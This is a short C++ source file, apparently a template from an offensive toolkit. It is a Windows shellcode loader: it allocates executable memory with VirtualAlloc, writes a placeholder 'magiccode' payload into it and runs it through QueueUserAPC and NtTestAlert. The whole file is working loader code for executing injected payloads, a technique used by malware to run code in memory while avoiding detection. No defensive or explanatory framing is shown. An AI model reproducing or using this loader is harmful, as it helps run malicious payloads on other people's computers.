/**
Editor: Thomas X Meng
***/

#include <windows.h>
#include <cstdio>

#pragma comment(lib, "ntdll")
using myNtTestAlert = NTSTATUS(NTAPI*)();

unsigned char magiccode[] = ####SHELLCODE####;



int main(int argc, char *argv[]) 
{
	myNtTestAlert testAlert = (myNtTestAlert)(GetProcAddress(GetModuleHandleA("ntdll"), "NtTestAlert"));
	SIZE_T magicSize = sizeof(magiccode);
	LPVOID magicAddress = VirtualAlloc(NULL, magicSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	WriteProcessMemory(GetCurrentProcess(), magicAddress, magiccode, magicSize, NULL);
	
	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)magicAddress;
    QueueUserAPC((PAPCFUNC)apcRoutine, GetCurrentThread(), (ULONG_PTR)0);
	testAlert();

	return 0;
}